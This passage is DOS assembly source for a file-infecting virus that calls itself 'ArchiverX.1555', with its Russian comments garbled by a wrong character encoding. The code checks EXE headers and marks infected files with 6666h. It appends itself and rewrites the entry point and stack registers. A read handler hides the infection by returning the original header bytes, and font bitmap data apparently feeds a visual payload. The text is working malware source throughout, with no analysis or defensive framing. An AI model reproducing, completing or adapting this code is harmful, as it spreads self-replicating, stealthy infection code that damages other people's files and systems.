   ;[*à®¢¥àï¥¬ â¨¯ ä ©«  ¨ ¥£® § à ¦¥®áâì]

   NoError:    cmp ds:[Header-Virus], 'ZM'
           jne Error
           cmp ds:[Header+12h-Virus], 6666h
           je  Error


   ;[…á«¨ NewEXE § £®«®¢®ª ¯à¨áãâáâ¢ã¥â, â® ¢ëå®¤¨¬]

           mov di, NewEXE-Virus
           mov ax, ds:[Temp-Virus]
           call    CmpStr
           jc  Error


   ;[‘®¤¥à¦¨â «¨ ä ©« ®¢¥à«¥¨]

           call    GetFSize
           call    Into512
           cmp ds:[Header+4-Virus], ax
           jne Error
           cmp ds:[Header+2-Virus], dx
           jne Error


   ;[‚ëç¨á«ï¥¬ ¤«¨ã ä ©«  á ¢¨àãá®¬]

           call    GetFSize
           add ax, CodeSize
           adc dx, 0
           call    Into512
           mov ds:[Header+4-Virus], ax
           mov ds:[Header+2-Virus], dx


   ;[‘®åà ï¥¬ SS, SP, CS, IP]

           mov ax, ds:[Header+0Eh-Virus]
           mov ds:[OldSS+1-Virus], ax
           mov ax, ds:[Header+10h-Virus]
           mov ds:[OldSP+1-Virus], ax
           mov ax, ds:[Header+16h-Virus]
           mov ds:[OldCS-Virus], ax
           mov ax, ds:[Header+14h-Virus]
           mov ds:[OldIP-Virus], ax


   ;[Š®àà¥ªâ¨àã¥¬ â®çªã ¢å®¤  ¨  ¤à¥á áâ¥ª ]

           call    GetFSize
           mov cx, 16
           div cx
           sub ax, ds:[Header+08h-Virus]
           mov ds:[Header+16h-Virus], ax
           mov ds:[Header+14h-Virus], dx
           mov ds:[Header+0Eh-Virus], ax
           mov ds:[Header+10h-Virus], CodeSize+100h


   ;[“áâ  ¢«¨¢ ¥¬ ¯à¨§ ª § à ¦¥¨ï ä ©« ]

           mov ds:[Header+12h-Virus], 6666h
           clc
           pop ds
           popa
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                         ‡€*€†…*ˆ… ”€‰‹€ ‚ *€ŒŸ’ˆ
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .386

   Exec3F:     pushad
           movzx   ecx, cx
           movzx   edx, dx

           mov eax, cs:[CurPos-Virus]
           sub eax, cs:[FSize-Virus]

           mov ebx, eax
           add ebx, ecx

           mov ebp, 18h
           sub ebp, cs:[CurPos-Virus]

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           cmp eax, large CodeSize
           jg  A06

           cmp eax, 0
           jle A01
           mov esi, edx
           mov edi, eax
           cmp ebx, large CodeSize
           jg  A03
           jmp A04

   A01:        cmp ebp, 0
           jge A02
           mov esi, edx
           sub esi, eax
           xor edi, edi
           cmp ebx, large CodeSize
           jg  A07
           cmp ebx, 0
           jg  A08
           jmp A06

   A02:        mov esi, edx
           mov edi, Header-Virus
           add edi, cs:[CurPos-Virus]
           cmp ebx, large CodeSize
           jg  A09
           cmp ebx, 0
           jg  A10
           cmp ecx, ebp
           jg  A12
           jmp A05

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   A03:        mov ecx, CodeSize
           sub ecx, eax
   A04:        call    SetNewPos
   A05:        call    Store
   A06:        popad
           ret

   A07:        mov ecx, CodeSize
           jmp A04

   A08:        mov ecx, ebx
           jmp A04

   A09:        mov ecx, ebp
           call    Store
           mov ecx, CodeSize
           jmp A11

   A10:        mov ecx, ebp
           call    Store
           mov ecx, ebx
   A11:        mov esi, edx
           sub esi, eax
           xor edi, edi
           jmp A04

   A12:        mov ecx, ebp
           jmp A05

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286

   Store:      jcxz    NoStore
           push    ax
   Loop2:      mov al, cs:[di]
           mov ds:[si], al
           inc si
           inc di
           loop    Loop2
           pop ax
   NoStore:    ret


   SetNewPos:  pusha
           mov bp, sp
           add [bp+36h], cx
           mov ax, 4201h
           mov bx, [bp+34h]
           mov dx, cx
           xor cx, cx
           int 65h
           popa
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                  *Ž„**Žƒ*€ŒŒ›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   GetFSize:   mov ax, ds:[FSize-Virus]
           mov dx, ds:[FSize+2-Virus]
           ret


   Into512:    mov cx, 512
           div cx
           or  dx, dx
           jz  $+3
           inc ax
           ret


   Seek:       mov ah, 42h
           xor cx, cx
           xor dx, dx
           int 65h
           ret


   CmpStr:     mov cx, 4
   Loop3:      cmp cs:[di], ax
           jne L3
           stc
           ret
   L3:     inc di
           inc di
           loop    Loop3
           clc
           ret


   Set24h:     mov ax, 2524h
           mov dx, Int24h-Virus
           push    cs
           pop ds
           int 65h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                 ˜*ˆ”’›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Font1       db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00111100b
           db  01000010b
           db  00000000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  01111110b
           db  10000001b
           db  00000000b
           db  00111100b
           db  01000010b
           db  00000000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  01111110b
           db  10000001b
           db  00000000b
           db  00111100b
           db  01000010b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  01111110b
           db  10000001b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

   Font1Ofs    dw  Font1-Virus

   Font2       db  00000000b
           db  00000000b
           db  00000000b
           db  10000000b
           db  11000000b
           db  11100000b
           db  01110000b
           db  00111000b
           db  00011100b
           db  00001110b
           db  00000110b
           db  00000010b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000010b
           db  00000110b
           db  00001110b
           db  00011100b
           db  00111000b
           db  01110000b
           db  11100000b
           db  11000000b
           db  10000000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  11111111b
           db  11111111b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b

   Font2Ofs    dw  Font2-Virus

   Font3       db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00110000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00001100b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b

   Font3Ofs    dw  Font3-Virus

   Font4       db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00111100b
           db  01000010b
           db  01011010b
           db  01011010b
           db  01000010b
           db  00111100b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00000000b
           db  00000000b

           db  00000000b
           db  00000000b
           db  00000000b
           db  00011000b
           db  00011000b
           db  00000000b
           db  00000000b
           db  00111100b
           db  01000010b
           db  01011010b
           db  01011010b
           db  01000010b
           db  00111100b
           db  00000000b
           db  00000000b

   Font4Ofs    dw  Font4-Virus

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                                „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   VirName     db  'ArchiverX.1555 -- Copyright (c) by DJ Sadovnikov'
   Arhivat     db  'PKARRAHA'
   NewEXE      db  'NEPELELX'

   CodeSize    =   $ - Virus

   Flag2       db  ?
   Temp        dd  ?
   CurPos      dd  ?
   FSize       dd  ?
   Header      db  18h dup (?)

   MemSize     =   $ - Virus

   Code        ends
           end Virus
